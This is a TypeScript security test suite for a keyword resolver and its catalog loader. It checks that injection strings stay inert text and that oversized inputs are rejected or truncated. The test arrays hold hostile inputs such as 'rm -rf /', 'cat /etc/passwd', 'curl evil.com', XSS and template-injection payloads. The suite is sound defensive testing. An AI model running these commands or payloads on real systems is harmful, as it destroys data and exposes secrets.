// Resolver v2 — security test suite.
// Phase 2K — security inputs per global CLAUDE.md:
//   - SQL injection in trigger
//   - XSS in trigger and catalog
//   - Path traversal in trigger
//   - Command injection in trigger
//   - Template injection
//   - Null byte injection
//   - Hallucinated/malicious recipient IDs

import { describe, it, expect, beforeEach } from "vitest";
import { createRequire } from "node:module";
import { resolve, join } from "node:path";
import * as fs from "node:fs";
import * as os from "node:os";

const cjsRequire = createRequire(import.meta.url);
const REPO = resolve(__dirname, "..", "..");
const fallback = cjsRequire(join(REPO, "scripts/resolver-v2/keyword-fallback.cjs"));
const loader = cjsRequire(join(REPO, "scripts/resolver-v2/catalog-loader.cjs"));
const audit = cjsRequire(join(REPO, "scripts/resolver-v2/audit.cjs"));
const E = cjsRequire(join(REPO, "scripts/resolver-v2/errors.cjs"));

describe("security — injection inputs", () => {
  beforeEach(() => loader.invalidateCache());

  it("SQL injection in trigger does not crash + no SQL execution", () => {
    const triggers = [
      "'; DROP TABLE users; --",
      "1 OR 1=1",
      "UNION SELECT * FROM passwords",
      "x'; DELETE FROM ops.resolver_decisions; --",
    ];
    for (const t of triggers) {
      const r = fallback.match({ trigger: t });
      // Should normalize and run without throwing, no DB call from Mode C
      expect(r.trigger_normalized).toBeDefined();
      // Audit record should safely serialize trigger as plain text
      const rec = audit.buildRecord(r);
      expect(typeof rec.trigger).toBe("string");
      expect(rec.trigger.length).toBeGreaterThan(0);
    }
  });

  it("XSS-style trigger does not execute", () => {
    const triggers = [
      "<script>alert(1)</script>",
      "<img onerror=alert(1)>",
      "javascript:alert(1)",
      "<svg onload=alert(1)>",
    ];
    for (const t of triggers) {
      const r = fallback.match({ trigger: t });
      expect(r.trigger_normalized).toBeDefined();
      // Audit safely contains text
      const rec = audit.buildRecord(r);
      expect(typeof rec.trigger).toBe("string");
    }
  });

  it("path traversal in trigger no file system access", () => {
    const triggers = [
      "../../../etc/passwd",
      "..\\..\\windows\\system32",
      "file:///etc/shadow",
      "/etc/passwd",
      "C:\\Windows\\System32",
    ];
    for (const t of triggers) {
      const r = fallback.match({ trigger: t });
      // Should NOT have read any file (Mode C only reads catalog)
      expect(r.trigger_normalized).toBeDefined();
      // No matched recipient should be returned just because of path-looking string
      // (unless catalog has a route with "etc" or "passwd" keyword, which it doesn't)
    }
  });

  it("command injection in trigger does not execute shell", () => {
    const triggers = [
      "; rm -rf /",
      "$(whoami)",
      "`id`",
      "| cat /etc/passwd",
      "&& curl evil.com",
    ];
    for (const t of triggers) {
      const r = fallback.match({ trigger: t });
      expect(r.trigger_normalized).toBeDefined();
      // Engine pure — no shell exec anywhere
    }
  });

  it("template injection no eval", () => {
    const triggers = [
      "{{constructor.constructor('return this')()}}",
      "${process.env.SECRET}",
      "{{7*7}}",
      "<%= 1+1 %>",
    ];
    for (const t of triggers) {
      const r = fallback.match({ trigger: t });
      // Should still be raw text, not evaluated
      expect(typeof r.trigger_normalized).toBe("string");
    }
  });

  it("null byte injection truncated/sanitized", () => {
    const r = fallback.match({ trigger: "evolve\x00skill" });
    expect(r.trigger_normalized).not.toContain("\x00");
  });

  it("header injection (CRLF) does not break audit", () => {
    const trigger = "value\r\nX-Injected: true\r\n";
    const r = fallback.match({ trigger });
    const rec = audit.buildRecord(r);
    // CRLF stripped by normalize
    expect(rec.trigger_normalized).not.toContain("\r");
  });
});

describe("security — catalog file integrity", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(join(os.tmpdir(), "resolver-sec-"));
    loader.invalidateCache();
  });

  it("catalog with malicious markdown does not eval", () => {
    fs.writeFileSync(join(tmpDir, "skills.md"),
      `## skill/test
**Kind:** skill
**When to use:** Test with <script>alert(1)</script> and \${process.env.SECRET}
**Invoke:** \`exec("rm -rf /")\`
**Status:** active
`);
    const cat = loader.loadCatalog({ recipientsDir: tmpDir });
    const r = cat.byId.get("skill/test");
    // Content stored as text, not evaluated
    expect(r.when_to_use).toContain("<script>");
    expect(r.invoke).toContain("exec");
    // No side effects from loading
  });

  it("catalog with crafted ID containing slashes preserved as text", () => {
    fs.writeFileSync(join(tmpDir, "skills.md"),
      `## skill/foo/../../etc/passwd
**Kind:** skill
**When to use:** Test path-traversal-looking ID.
**Invoke:** \`x\`
**Status:** active
`);
    // Should parse without doing file system access
    const cat = loader.loadCatalog({ recipientsDir: tmpDir });
    const ids = Array.from(cat.byId.keys());
    expect(ids.some(id => id.includes("../"))).toBe(true);
    // No file written/read at /etc/passwd
  });
});

describe("security — hallucinated recipient IDs", () => {
  it("HallucinatedRecipient error carries safe data", () => {
    const e = new E.HallucinatedRecipient("ghost/notreal", ["a", "b"]);
    expect(e.recipientId).toBe("ghost/notreal");
    expect(e.message).toContain("ghost/notreal");
    // No code execution from constructing error
  });

  it("audit buildRecord rejects matched with non-string ID safely", () => {
    const r = audit.buildRecord({
      trigger: "x", trigger_normalized: "x",
      matched: { id: { malicious: "object" }, confidence: 0.9 },
      alternatives: [], latency_ms: 1,
    });
    // matched_route_id must be string or null (never an object)
    expect(r.matched_route_id === null).toBe(true);
  });
});

describe("security — DoS protection", () => {
  it("trigger 10001 chars rejected (above 1000 limit)", () => {
    expect(() => fallback.match({ trigger: "x".repeat(10001) })).toThrow(E.TriggerTooLong);
  });

  it("audit buildRecord with huge trigger truncates", () => {
    const r = audit.buildRecord({
      trigger: "x".repeat(100000),
      trigger_normalized: "x",
      matched: null, alternatives: [], latency_ms: 1,
    });
    expect(r.trigger.length).toBeLessThanOrEqual(500);
  });

  it("audit buildRecord with huge llm_reasoning truncates", () => {
    const r = audit.buildRecord(
      { trigger: "x", trigger_normalized: "x", matched: null, alternatives: [], latency_ms: 1 },
      { llm_reasoning: "x".repeat(100000) }
    );
    expect(r.llm_reasoning?.length).toBeLessThan(2100);
  });

  it("audit buildRecord with huge composition_supporting truncates", () => {
    const r = audit.buildRecord(
      { trigger: "x", trigger_normalized: "x", matched: null, alternatives: [], latency_ms: 1 },
      { composition_supporting: Array(10000).fill("skill/x") }
    );
    expect(r.composition_supporting?.length).toBe(20);
  });
});
